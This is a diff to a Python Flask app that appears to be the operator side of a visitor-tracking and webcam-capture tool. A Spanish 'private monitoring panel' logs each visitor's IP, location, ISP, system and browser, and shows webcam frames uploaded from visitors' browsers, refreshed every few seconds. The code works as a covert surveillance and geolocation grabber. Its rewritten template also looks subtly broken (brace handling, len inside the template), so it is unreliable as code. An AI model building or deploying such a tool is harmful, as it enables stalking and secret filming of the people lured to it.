@@ -827,10 +827,16 @@ def upload_frame():
     img = data.get("image")
 
     if img:
+        import base64
+
         img_data = img.split(",")[1]
+
         with open("static/cam.jpg", "wb") as f:
-            import base64
             f.write(base64.b64decode(img_data))
+
+        # indicador de cámara activa
+        with open("static/cam_active.txt", "w") as f:
+            f.write("1")
 
     return {"status": "ok"}
 
@@ -842,52 +848,62 @@ def dashboard():
     except:
         logs = []
 
-    # mostrar primero los registros más recientes
-    logs = list(reversed(logs))
+    # Verifica si la cámara está activa
+    camera_active = os.path.exists("static/cam_active.txt")
 
+    # Si la cámara está activa, muestra el HTML para la cámara
+    camera_html = ""
+    if camera_active:
+        camera_html = """
+        <div class="camera-section">
+        <div class="cam-header">
+        <span class="cam-indicator"></span>
+        <span>Cámara detectada</span>
+        </div>
+        <div class="cam-frame">
+        <img id="liveCam" src="/static/cam.jpg">
+        </div>
+        <div class="cam-footer">
+        Actualización automática cada 3 segundos
+        </div>
+        </div>
+        """
+
+    logs = list(reversed(logs))  # Mostrar los registros más recientes
     log_cards = ""
     for i, log in enumerate(logs):
         log_cards += f"""
         <div class="log-card">
             <div class="log-index">#{str(i+1).zfill(3)}</div>
-
             <div class="log-grid">
-
                 <div class="log-field">
                     <span class="label">IP</span>
                     <span class="value mono">{log.get('ip','—')}</span>
                 </div>
-
                 <div class="log-field">
-                <span class="label">PAÍS</span>
-                <span class="value">{log.get('country','—')}</span>
+                    <span class="label">PAÍS</span>
+                    <span class="value">{log.get('country','—')}</span>
                 </div>
-
                 <div class="log-field">
-                <span class="label">CIUDAD</span>
-                <span class="value">{log.get('city','—')}</span>
+                    <span class="label">CIUDAD</span>
+                    <span class="value">{log.get('city','—')}</span>
                 </div>
-
                 <div class="log-field">
-                <span class="label">PROVEEDOR</span>
-                <span class="value truncate">{log.get('isp','—')}</span>
+                    <span class="label">PROVEEDOR</span>
+                    <span class="value truncate">{log.get('isp','—')}</span>
                 </div>
-
                 <div class="log-field">
                     <span class="label">SISTEMA</span>
                     <span class="value">{log.get('platform','—')}</span>
                 </div>
-
                 <div class="log-field">
                     <span class="label">NAVEGADOR</span>
                     <span class="value truncate">{log.get('browser','—')}</span>
                 </div>
-
                 <div class="log-field">
                     <span class="label">HORA</span>
                     <span class="value mono">{log.get('time','—')}</span>
                 </div>
-
             </div>
         </div>
         """
@@ -899,20 +915,18 @@ def dashboard():
     </div>
     """
 
-    return f"""<!DOCTYPE html>
+    return render_template_string("""
+<!DOCTYPE html>
 <html lang="es">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Monitor · Privado</title>
 
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- refresco automático -->
+    <meta http-equiv="refresh" content="5">
 
-<!-- refresco automático -->
-<meta http-equiv="refresh" content="5">
-
-<title>Monitor · Privado</title>
-
-<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
-
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
 <style>
 
 *{{box-sizing:border-box;margin:0;padding:0}}
@@ -1043,10 +1057,54 @@ color:var(--text-dim);
 .camera-section{{
 max-width:900px;
 margin:50px auto;
-background:var(--surface);
-border:1px solid var(--border);
+background:#0e1318;
+border:1px solid #1c2530;
 padding:20px;
+border-radius:12px;
+box-shadow:0 0 25px rgba(0,0,0,0.6);
+}}
+
+.cam-header{{
+display:flex;
+align-items:center;
+gap:10px;
+font-size:14px;
+color:#00e5ff;
+margin-bottom:10px;
+}}
+
+.cam-indicator{{
+width:10px;
+height:10px;
+background:#00ff88;
+border-radius:50%;
+box-shadow:0 0 10px #00ff88;
+animation:blink 1s infinite;
+}}
+
+@keyframes blink{{
+0%{opacity:1}
+50%{opacity:0.3}
+100%{opacity:1}
+}}
+
+.cam-frame{{
+width:100%;
+background:black;
 border-radius:10px;
+overflow:hidden;
+border:1px solid #1c2530;
+}}
+.cam-frame img{{
+width:100%;
+display:block;
+object-fit:cover;
+}}
+
+.cam-footer{{
+font-size:11px;
+color:#4a6070;
+margin-top:8px;
 }}
 
 .camera-box video{{
@@ -1066,65 +1124,50 @@ border-radius:6px;
 
 </style>
 </head>
-
 <body>
+    <header>
+        <div>
+            <span class="header-tag">// sistema de monitoreo</span>
+            <h1>Panel <span style="color:var(--accent)">Privado</span></h1>
+        </div>
+    </header>
 
-<header>
-<div>
-<span class="header-tag">// sistema de monitoreo</span>
-<h1>Panel <span style="color:var(--accent)">Privado</span></h1>
-</div>
-</header>
+    <div class="stats-bar">
+        <div class="stat">
+            <div class="stat-label">TOTAL REGISTROS</div>
+            <div class="stat-value">{{ len(logs) }}</div>
+        </div>
 
-<div class="stats-bar">
+        <div class="stat">
+            <div class="stat-label">ÚLTIMO ACCESO</div>
+            <div class="stat-value">{{ logs[0].get('time','—') if logs else '—' }}</div>
+        </div>
 
-<div class="stat">
-<div class="stat-label">TOTAL REGISTROS</div>
-<div class="stat-value">{len(logs)}</div>
-</div>
+        <div class="stat">
+            <div class="stat-label">ÚLTIMA IP</div>
+            <div class="stat-value">{{ logs[0].get('ip','—') if logs else '—' }}</div>
+        </div>
+    </div>
 
-<div class="stat">
-<div class="stat-label">ÚLTIMO ACCESO</div>
-<div class="stat-value">{logs[0].get('time','—') if logs else '—'}</div>
-</div>
+    <div class="logs-container">
+        {{ log_cards }}
+        {{ empty_state }}
+    </div>
 
-<div class="stat">
-<div class="stat-label">ÚLTIMA IP</div>
-<div class="stat-value">{logs[0].get('ip','—') if logs else '—'}</div>
-</div>
+    <!-- Aquí es donde se inserta el HTML de la cámara -->
+    {{ camera_html }}
 
-</div>
-
-<div class="logs-container">
-{log_cards}
-{empty_state}
-</div>
-
-<div class="camera-section">
-<h3>Transmisión del dispositivo</h3>
-
-<img id="liveCam"
-src="/static/cam.jpg"
-style="width:100%;border-radius:8px">
-
-<p style="margin-top:10px;color:#4a6070">
-La imagen se actualiza automáticamente si el usuario aceptó la cámara.
-</p>
-
-</div>
-
-<script>
-
-setInterval(()=>{
-    const cam = document.getElementById("liveCam");
-    cam.src = "/static/cam.jpg?" + new Date().getTime();
-},3000);
-
-</script>
-
+    <script>
+        setInterval(() => {
+            const cam = document.getElementById("liveCam");
+            if (cam) {
+                cam.src = "/static/cam.jpg?" + new Date().getTime();
+            }
+        }, 3000);
+    </script>
 </body>
 </html>
-"""
+""", logs=logs, log_cards=log_cards, empty_state=empty_state, camera_html=camera_html)
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
